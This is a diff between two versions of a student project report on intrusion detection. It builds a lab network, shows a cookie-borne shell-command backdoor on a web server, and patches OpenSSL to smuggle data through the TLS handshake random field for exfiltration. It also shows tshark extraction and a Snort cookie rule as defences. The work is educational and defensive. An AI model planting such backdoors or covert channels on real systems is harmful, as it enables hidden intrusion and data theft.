@@ -7,33 +7,33 @@ author:
 
 # Introduction
 
-Organizations are constantly trying to protect themselves from attackers. These attackers seek to propagate through an organizations network or exfiltrate data. Intrusion Detection Systems (IDSs) can provide the defense an organization need against these adversaries. Attackers are constantly developing methods for attack, so defense mechanisms must evolve accordingly. In this project, we have explored various attack vectors that adversaries may take to gain leverage in an organization's network. We developed some infrastructure simulating a realistic network topology, came up with and implemented a few different attack vectors, and explored defending against them.
+Organizations are constantly trying to protect themselves from attackers. These attackers seek to propogate through an organizations network or exfiltrate data. Intrusion Detection Systems (IDSs) can provide the defense an organization need against these adversaries. Attackers are constantly developing methods for attack, so defense mechanisms must evolve accordingly. In this project, we have explored various attack vectors that adversaries may take to gain leverage in an organization's network. We developed some infrastructure simulating a realistic network topology, came up with and implemented a few different attack vectors, and explored defending against them.
 
 # Reconnaissance Phase
 
-The goal of intrusion detection systems (IDS) is to identify and block suspicious network behavior. This suspicious network traffic may come from attackers who want to attack networks for a variety of reasons. Attackers may want to harm the availability of the service. One way of doing this is through a Denial of Service (DOS) attack, such as the Mirai attacks, which is focused on bringing down or overwhelming a networked service so that it cannot respond to legitimate requests(15). In addition, attackers may want to affect confidentiality, such as by stealing data or account credentials from a company. One high profile example of this is the Equifax Breach, where hackers were able to gain access to over 140 million customers social security numbers by using known vulnerabilities that Equifax had failed to patch(1).  Attackers may want to exploit integrity and authenticity. For example, in a trust relationship attack, an attacker could escalate their privileges by gaining access to a less protected server and use a trust relationship to pivot and gain access to a more secure server(2).  
+The goal of intrusion detection systems (IDS) is to identify and block suspicious network behavior. This suspicious network traffic may come from attackers who want to attack networks for a variety of reasons. Attackers may want to harm the availability of the service. One way of doing this is through a Denial of Service (DOS) attack, such as the Mirai attacks, which is focused on bringing down or overwhelming a networked service so that it cannot respond to legitimate requests(source). In addition, attackers may want to affect confidentiality, such as by stealing data or account credentials from a company. One high profile example of this is the Equifax Breach, where hackers were able to gain access to over 140 million customers social security numbers by using known vulnerabilities that Equifax had failed to patch(1).  Attackers may want to exploit integrity and authenticity. For example, in a trust relationship attack, an attacker could escalate their privileges by gaining access to a less protected server and use a trust relationship to pivot and gain access to a more secure server(2).  
 
-Network security specialists must defend from these attacks. There are three major categories of IDS: packet inspection tools, flow monitoring tools, and software defined Networking (SDN) based monitoring. Each IDS has tradeoffs between performance and being able to better connect, and the pros and cons of each approach is discussed.
+Network security specialists must defend from these attacks. There are three major categories of IDS: Packet inspection tools, Flow monitoring tools, and Software defined Networking (SDN) based monitoring. Each IDS has tradeoffs between performance and being able to better connect , and the pros and cons of each approach is discussed.
 
 ## Packet Inspection Tools
 
 Packet inspection tools analyze the headers and data from packets going through a network in order to identify malicious traffic (3). This is done using a programmable set of rules which defined the malicious traffic, which is then filter out by the packet inspection tool. Packet inspection tools are best implemented on the edge of your private network, acting as a gateway to the public internet.  Packet inspections tools include implementations such as Snort (4), nDPI (5), and Zeek (6). 
 
-Packet inspection tools can be configured to defend against most types of attacks. Rules can be created  to detect and mitigate availability attacks, such as DoS attacks. Rules can be used to identify malicious traffic to help defend a systems authenticity, integrity, and confidentiality goals.
+Packet inspection tools can be configured to defend against most types of attacks. Rules can be created  to detect and mitigate availability attacks, such as DoS attacks. Rules can be used to detect malicious data transitions to help defend a systems authenticity, integrity, and confidentiality goals.
 
-These tools are helpful because they are able to give detailed analysis on the traffic going though a network. This enables it to more easily detect traffic which contains malicious data such as viruses. The use of programmatic rules makes packet inspection easily able to protect against new types of attacks.
+These tools are good because they are able to give more detailed analysis on the traffic going though a network. This enables it to more easily detect traffic which contains malicious traffic such as viruses. The use of programmatic rules makes packet inspection easily able to protect against new types of attacks.
 
-The are several cons to packet inspections tools. One of the main concerns for packet inspection is performance(7). Packet inspection can be very CPU intensive as it must analyze all traffic through the network interface. This also means that it is hard to scale, because it needs the hardware it is run on to scale with the traffic requirements. This means that for high bandwidth connections, tradeoffs may need to be made between security and speed.
+The are several cons to packet inspections tools. One of the main concerns for packet inspection is performance(7). Packet inspection can be very CPU intensive as it must analyze all traffic through the network interface. This also means that it is hard to scale, because it needs the hardware it is run on to scale with the traffic requirements. 
 
 ## Flow Monitoring Tools
 
-Flow monitoring tools are able to protect networks by aggregating traffic information into flows and later analyzes the flow data. This is done in three steps: Flow exporting, flow collecting, and flow analyzing. Flow monitoring tools can be enabled on most routers and switches. It is suggested flow monitoring is distributed across your network to give wide view of your network. There are many different flow monitoring tools such as SolarWinds(8) or ManageEngine(9), and almost all tools used the NetFlow protocol(10).  
+Flow monitoring tools are able to protect networks by aggregating traffic information into flows and later analyzes the flow data. This is done in three steps: Flow exporting, flow collecting, and flow analyzing. Flow monitoring tools can be enabled on most routers and switches. It is suggested flow monitoring is distributed across your network to give wide view of your network. There are many different flow monitoring tools such as SolarWinds(8) or ManageEngine(9), but most used the NetFlow protocol(10).  
 
 Flow monitoring tools are able to easily detect availability-based attacks. In addition, they can detect simpler confidentiality, integrity, and authenticity attacks which use easily identifiable traffic patterns. However, as these attacks become more sophisticated, flow monitoring tools are less likely to detect the intrusion.
 
-One of the benefits of flow monitoring tools is that nearly all routers support the tools, so they are easy to configure and use. Another benefit is that it is distributed, giving statistics throughout your entire network (11). Finally, flow monitoring tools have a very low overhead (11), which combined with easy  deployment make them very easy to scale.  
+One of the benefits of flow monitoring tools is that nearly all routers support the tools, so they are easy to configure and use. Another benefit is that it is distributed, giving an idea of network through your entire network (11). Finally , flow monitoring tools have a very low overhead (11), which combined with ease to deploy make them very easy to scale.  
 
-There are several cons to flow networking tools. First, they are less dynamic when compared to packet inspection tools as they cannot respond to attacks which are detected. In addition, they see less details compared to packet inspection, so they may not be able to detect more sophisticated attacks. This means that although flow monitoring tools are helpful, they may not be enough on their own to properly protect a private network. 
+There are several cons to flow networking tools. First, they are less dynamic when compared to packet inspection tools as they cannot respond to attacks which are detected. In addition, they see less details compared to packet inspection, so they may not be able to detect more sophisticated attacks.
 
 ## SDN-based Monitoring
 
@@ -41,9 +41,10 @@ Software Defined Networking (SDN) is a network architecture focused on improving
 
 One example of SDN-based-monitoring implements TLSDeputy, a TLS verification tool, to protect residential networks(13). The residential network contains a OpenFlow which his configured to route new flows through the TLSDeputy to verify the TLS handshake, and once verified leaves a direct connection between the client and server. This use of SDN implements extra monitoring of TLS handshakes, keeping clients more protected.
 
-SDN-based monitoring is a powerful combination of the benefits of packet inspection tools and flow monitoring. Like flow monitoring, it can be easily deployed and scaled. In addition, it gives more visibility and control over the network(14). However, like packet inspections it can be dynamically configured, and can both detect and mitigate attacks. SDN-based monitoring can be configured to detect availability attacks and mitigate their effects. In addition, the controller can implement rules and services which help in detecting or stopping authenticity and integrity based attacks. For example, the controller can control network rules so that only software systems that need to talk to each other can.
+SDN-based monitoring is a powerful combination of the benefits of packet inspection tools nd flow monitoring. Like flow monitoring, it can be easily deployed and scaled. In addition, it gives more visibility and control over the network(14). However, like packet inspections it can be dynamically configured, and can both detect and mitigate attacks. SDN-based monitoring can be configured to detect availability attacks and mitigate their effects. In addition, the controller can implement rules and services which help in detecting or stopping Authenticity and Integrity based attacks. For example, the controller can control network rules so that only software systems that need to talk to each other can talk to each other.
 
 There are negatives to SDN-based monitoring. The centralization of control to a single OpenFlow controller means that there is a single point of failure(14). If this is exploited, attackers could gain nearly complete control of the SDN in question.  
+
 
 # Infrastructure
 
@@ -112,17 +113,17 @@ CLI(net)
 net.stop()
 ```
 
-Containernet makes creating this network topology extremely easy. We can define exactly what hosts we want using `net.addDocker()`, create links with `net.addLink()`, and add switches using `net.addSwitch()`. Once all of our Docker images are generated, which we have created a makefile to do, we can just run the above python program and Containernet will create our network for us and give us a shell into any host the network.
+Containernet makes creating this network topology extremely easy. We can define exactly what hosts we want using `net.addDocker()`, create links with `net.addLink()`, and add switches using `net.addSwitch()`. Once all of our Docker images are generated, which we have created a makefile to do, we can just run the above python program and Containernet will create our network for us and give us a shell into the network.
 
 ## Defined Network Topology
 
-In our defined network topology, we have two different switches, representing a LAN and a WAN. The LAN contains our web server which handles HTTP requests from clients, and a database which contains a bunch of dummy data to be served up. The WAN contains our simulated clients and our command and control. Both the LAN and the WAN are connected via a bridge that we have implemented in another container.
+In our defined network topology, we have two different subnets, representing a LAN and a WAN. The LAN contains our web server which handles HTTP requests from clients, and a database which contains a bunch of dummy data to be served up. The WAN contains our simulated clients and our command and control. Both the LAN and the WAN are connected to a switch, which are connected to a bridge that we have implemented in another container.
 
 ### Web Server
 
-The web server is our compromised host on the LAN. We have set it up to communicate with the database on the same network. We have given it some basic functionality, such as logging in, creating a user, and returning the information associated with the signed in user (we have elected to store a SSN). A user can sign into our web server with a simple `http post` such as `curl -d user_id=1 10.0.0.3:5000/signin`. Here we are passing in our ID of 1, and we will be signed in. We are then redirected to `/home`, where our information is displayed. 
+The web server is our compromised host on the LAN. We have set it up to communicate with the database on the same network. We have given it some basic functionality, such as logging in, creating a user, and returning the information associated with the signed in user (we have elected to store an SSN). A user can sign into our web server with a simple `http post` such as `curl -d user_id=1 10.0.0.3:5000/signin`. Here we are passing in our ID of 1, and we will be signed in. We are then redirected to `/home`, where our information is displayed. 
 
-The concept of "signing in" here is implemented with cookies. A user can make a signin request to the web server with their user ID, and the web server will create a cookie and return it to the user. The user then makes a request to the `/home` page of the web server and passes in that cookie, which contains their user ID, and they are returned their information from the database. An example of a cookie from our web server looks like this:
+The concept of "signing in" here is implemented with cookies. A user can make a signin request to the web server with their user ID, and the web server will create a cookie and return it to the user. The user then makes a request to the `\home` page of the web server and passes in that cookie, which contains their user ID, and they are returned their information from the database. An example of a cookie from our web server looks like this:
 
 ```
 10.0.0.3	FALSE	/	FALSE	0	session_id	97
@@ -130,11 +131,9 @@ The concept of "signing in" here is implemented with cookies. A user can make a 
 
 In the above case, the ID of the user making the request is 97.
 
-Obviously this is not a secure protocol, but it works the same way signed tokens do at the network level.
-
 ### Database
 
-We have created a Postgres instance for our web server to retrieve data from. The schema we have defined is very simple; each record consists of a user ID, a name, and a social security number (SSN). We populated this database using a python library called `Faker` which can generate realistic data for this purpose. A few entries of this data are as follows:
+We have created a Postgres instance for our web server to retrieve data from. The schema we have defined is very simple; each record consists of a user ID, a name, and a social security number (SSN). We populated this database using a python library called `Faker` which can generate realistic data for this purpopse. A few entries of this data are as follows:
 
 ```
 1	Dr. Daniel Hughes DDS	566-34-2680
@@ -152,17 +151,17 @@ COPY dump.sql /docker-entrypoint-initdb.d/
 
 ### Clients
 
-We have created three basic web clients in order to generate legitimate traffic across our bridge. These clients are configured with a script `client.sh` for making requests to the web server. The script makes a signin request to the entered host and stores the received cookie. The command is as follows:
+We have created three basic web clients in order to generate legitimate traffic across our bridge. These clients are configured with a script `client.sh` for making requests to the web server. The script makes a signin request to the entered port number and stores the received cookie. The command is as follows:
 
 ```
 curl -s -c cookies -XPOST -F "user_id=$((RANDOM % 1000))" "http://$1:5000/signin" | w3m -dump -T text/html
 ```
 
-The client then makes a request to the `/home` page using the cookie it returned, and effectively logs out by deleting it's cookie. We also have included a script called `loadgen.sh` which runs `client.sh` every two seconds repeatedly to generate traffic through the bridge.
+The client then makes a request to the `/home` page using the cookie it returned, and effectively logs out by deleting it's cookie. We also have included a script called `loadgen.sh` which runs `client.sh` every half a second repeatedly to generate traffic through the bridge.
 
 ### Bridge
 
-We have created a container to simulate a connection between the LAN and WAN. We have defined this container in a folder called `router`, as it simulates the channel through which all of the traffic must run, but it is really more of a firewall. Containernet provides two virtual ethernet connections to the respective switches, so we create a bridge interface to create a virtual cable between them, while allowing an IDS to listen to all the traffic coming and going from the LAN. 
+We have created a container to simulate a connection between the LAN and WAN. We have defined this container in a folder called `router`, as it simulates the channel through which all of the traffic must run. We simply fluish our ip tables and create two bridge interfaces and link them together in a script `entry.sh`:
 
 ```
 ip addr flush dev $IFIN
@@ -179,19 +178,22 @@ The reason we created a container to house this is to allow us to have a man in 
 
 ## Cookie Attack
 
-The first phase of our attack hides our executable code in one of the cookies sent by our command and control server (C2). This attack vector allows us to run code on our compromised server by making normal looking HTTP requests from our C2. We can generate our cookie inline in the curl command as follows:
+The first phase of our attack hides our executable code in one of the cookies sent by our C2. This attack vector allows us to run code on our compromised server by making normal looking HTTP requests from our C2. We can generate our cookie inline in the curl command as follows:
 
 ```
-curl -b "secret_message:echo You've been compromised :D" -d "user_id=1000" http://10.0.0.3:5000/home
+curl -d "secret_message:"echo You've been compromised!"" -d "user_id=1000" http://10.0.0.3:5000/home
 ```
+<!--
+    TODO: make the command above meaningful
+-->
 
-As one can see, we have embedded some shell code in a field of the cookie we are passing in. Now this isn't going to do anything without a little help from our compromised server. This being the case, we have added some code in the web server to check whether or not there is a `secret_message` cookie. If it has one, the server will attempt to execute the code included in that field. The output will be put into a cookie and sent back to our C2 host. With this structure, the web server will continue to serve other clients as normal, but still can execute the arbitrary code bits that we send to it.
+As one can see, we have embedded some shell code in a field of the cookie we are passing in. Now this isn't going to do anything without a little help from our compromised server. This being the case, we have added some code in the web server to check whether or not the cookie has a `secret_message` field. If it does, the server will attempt to execute the code included in that field. The output will be put into a cookie and sent back to our C2 host. With this structure, the web server will continue to serve other clients as normal, but still can execute the arbitrary code bits that we send to it.
 
 ## TLS Handshake Attack
 
-From the perspective of a router, our cookie attack looks just like normal web requests. However, if somebody was able to intercept a cookie we sent over the network and peek at the contents, they would clearly see that the cookie was malicious. This being the case, we wanted to come up with something a little bit harder to detect. We embed data into 32 byte client random field of the TLS handshake. Since this data is typically just random bytes, if we were to encrypt the data we're sending it would be theoretically indistinguishable from random bytes and therefore undetectable at the network level(this data is normally not ever seen by humans anyway). Fortunately, we have a compromised web server on which we could implant the public key of our C2 host giving us a two way encrypted channel. Theoretically, we could establish an encrypted 2 way channel through this field.
+From the perspective of a router, our cookie attack looks just like normal web requests. However, if somebody was able to intercept a cookie we sent over the network and peek at the contents, they would clearly see that the cookie was malicious. This being the case, we wanted to come up with something a little bit harder to detect. We came up with the idea of embedding data into 32 bit random field of the TLS frame. Since this data is typically just random bits, if we were to encrypt the data we're sending it would be theoretically indistinguishable from random bits and therefore undetectable (this data is normally not ever seen by humans anyway). Fortunately, we have a compromised web server on which we could implant the public key of our C2 host giving us a two way encrypted channel. Theoretically, we could establish an encrypted 2 way channel through this field.
 
-To implement our TLS handshake attack, we had to create a patch for the `OpenSSL` library on tag `OpenSSL_1_1_0d` used by our C2 server.
+To implement our TLS handshake attack, we had to create a patch for the `OpenSSL` library used by our C2 and our server, shown below.
 
 ```
 diff --git a/ssl/s3_lib.c b/ssl/s3_lib.c
@@ -247,11 +249,9 @@ index e94ee83717..dea248539c 100644
  int ssl_generate_master_secret(SSL *s, unsigned char *pms, size_t pmslen,
 ```
 
-Instead of generating a random sequence of 32 bits, we simply load an integer in from a text file. This is where we could embed shell code or other information, but for our use case we simply have embedded an integer in the first four bytes of the random sequence. Now we can run a request using https from our C2, and the TLS handshake will automatically be initiated. On the server side we use `tshark` to extract the client random from each handshake:
+Instead of generating a random sequence of 32 bits, we simply load a string in from a text file. This is where we could embed shell code or other information, but for our use case we simply have embedded an integer in the first four bits of the random sequence. Now we can run a request using https from our C2, and the TLS handshake will automatically be initiated. We have written some code to extract this from the TLS handshake, and the output is below:
 
 ```
-tshark -l -i ws-eth0  -f "tcp port 5000" -Y "ssl.handshake.type == 1" -o http.ssl.port:5000 -T fields -e ssl.handshake.random_bytes 2>/dev/null
-
 # Real Clients
 29:81:95:f6:85:5e:64:cf:b3:2e:1d:60:70:92:a0:fa:df:b2:44:58:0c:06:67:ca:b4:f4:0a:72
 62:b4:60:ea:ce:ee:2f:eb:c0:b1:50:a5:81:56:12:b2:ec:13:87:10:49:f2:3d:09:72:79:06:85
@@ -266,9 +266,9 @@ tshark -l -i ws-eth0  -f "tcp port 5000" -Y "ssl.handshake.type == 1" -o http.ss
 07:00:00:00:d9:14:34:a4:d5:07:57:5b:a5:88:c4:98:47:1d:f7:fb:b2:5f:52:ae:00:00:00:00
 ```
 
-As one can see, the real clients have legitimate random data. Our C2 sends our desired data in the first four octets of the sequence. We also have set the last 4 octets to be all zeros in order to denote which packets have encoded data, and which do not. This is clearly detectable at the network layer, but if we had encrypted the data, it would not be distinguishable from random data.
+As one can see, the real clients have legitimate random data. Our C2 sends our desired data in the first four octets of the sequence. We also have set the last 4 octets to be all zeros in order to denote which packets have encoded data, and which do not. We could not embed arbitrary bytes and interpret them in any way we desire on our compromised server. We could simply put executable code into these fields and execute them on the server, and return data to our C2 iteratively through the same means.
 
-We have written some code to detect hidden messages. Since the bytes are little-endian in the 32 bit random field of the TLS handshake, we reverse the order of the bytes, and then interpret the value as an integer. In a more complicated system where this data was encrypted, we would simply decrypt the data. The last two bytes could be sacrificed for a checksum, which would be a perfect way for us to tell if there was an encoded message or not. However, for the sake of simplicity, we have just designated the last 4 bytes of an encoded message to be all zeros.
+We have written some code to detect hidden messages. Since the bytes are little-endian in the 32 bit random field of the TLS handshake, we had to flip each byte, reverse the order of the bytes, and then interpret the value as an integer. In a more complicated system where this data was encrypted, we would simply decrypt the data. The last two bytes could be sacrificed for a checksum, which would be a perfect way for us to tell if there was an encoded message or not. However, for the sake of simplicity, we have just designated the last 4 bytes of an encoded message to be all zeros.
 ```
 root@ws:/usr/local/server# ./exfil.sh
 + tshark -l -i ws-eth0 -f 'tcp port 5000' -Y 'ssl.handshake.type == 1' -o http.ssl.port:5000 -T fields -e ssl.handshake.random_bytes
@@ -299,7 +299,7 @@ EXFIL REQUEST FOR 23
 EXFIL REQUEST FOR 24
 EXFIL REQUEST FOR 25
 ```
-On the server we listen and parse out matching TLS handshakes. From our C2 server, we are simply sending integers from 1 to 25 to demonstrate that we can send dynamic data.
+Above we are running a script that makes a HTTPS requests to our web server with iterating values in the 32 bit random field. `exfil.py` is the code that is parsing out the data from that field. We have successfully communicated the ID of the user who's data we want to exfiltrate.
 
 ```
 root@c2:/# curl -k https://10.0.0.3:5000
@@ -322,7 +322,7 @@ root@c2:/# curl -k https://10.0.0.3:5000
 </body>
 ```
 
-Above, we can see that we can successfully make requests over HTTPS. We don't need to pass in a user ID because that information is embedded in the the `/user_id` file. This is crucial because the entire protocol still functions as intended. There were no modifications at the server to the TLS protocol. 
+Above, we can see that we can successfully make requests over HTTPS. We don't need to pass in a user ID because that information is embedded in the the `/user_id` file. 
 
 # Defense Phase
 
@@ -341,15 +341,13 @@ We then defined several rules to check cookies for containing commonly used shel
 ```
 alert tcp any any -> any 5000 (msg:"Malicious cookie detected!"; content:"sudo"; http_cookie; sid:100;)
 ```
-This rule tells Snort to alert if a cookie extracted from an http cookie contains `sudo`. We can define these rules for any shell commands we choose. 
+This rule tells Snort to alert if a cookie extracted from an http cookie contains `sudo`. We can define these rules for any shell commands we choose.
 
 ## TLS Handshake Defense
 
+TLS necessarily must do a key exchange in order to create a secure channel. Since key exchanges have to be done over a public channel, in order to protect the key generation against snooping there must be random data included in the TLS handshake somewhere. This is used in the Diffie-Hellman key exchange algorithm. Therefore, this idea of putting data into the random field is a vulnerability of any key exchange protocol. Encrypted data is also theoretically indistinguishable from random data, so this type of attack is undetectable.
+
 # Conclusion
-
-This examination into intrusion detections systems (IDS) has revealed how difficult properly implementing these systems can be. There are several types of IDS, each of which is focused on solving different issues. Packet inspection tools focus on protecting the gateway to a private network by using rules to detect malicious packets. Flow monitoring tools allow distribute analysis of the private network. SDN-based monitoring allows distributed analysis, while also allowing dynamic protection rules. 
-
-Despite the availability of several powerful defense tools, there are many ways to attack, allowing attackers to overcome availability, confidentiality, authenticity and integrity security goals. In addition, this project shows how it is nearly impossible to detect intrusions if you don't know the method of communication. A seemingly harmless feature such as cookies can be used to smuggle data into nd out to a private network. This is just one example, and there is an exhaustive list of other methods. Even if rules can be defined to identify these methods of covert communication, as we showed was possible with cookies, there are still undetectable ways of communication. The TLS handshake is an example of this, where a field containing random data could instead have malicious data, un undetectable attack. Overall, this shows the difficult of properly protecting networks, and the need for strong IDS tools. 
 
 
 
@@ -369,4 +367,4 @@ Despite the availability of several powerful defense tools, there are many ways 
 12. https://www.opennetworking.org/sdn-definition/?nab=1&utm_referrer=https://www.google.com/
 13. https://web.cs.wpi.edu/~cshue/research/cns16.pdf
 14. http://comsoft-bh.com/2018/01/21/pros-and-cons-of-software-defined-networking-sdn/
-15. https://www.csoonline.com/article/3258748/the-mirai-botnet-explained-how-teen-scammers-and-cctv-cameras-almost-brought-down-the-internet.html
+15. https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=2ahUKEwjKgeeG0afmAhXK1FkKHWHDDxIQFjAAegQIAhAC&url=https%3A%2F%2Fwww.rit.edu%2Facademicaffairs%2Ffacultyscholarship%2Fsubmit%2Fdownload_file.php%3Fid%3D18969&usg=AOvVaw2bTpiKIIbyRY3f8lPJ0jRQ
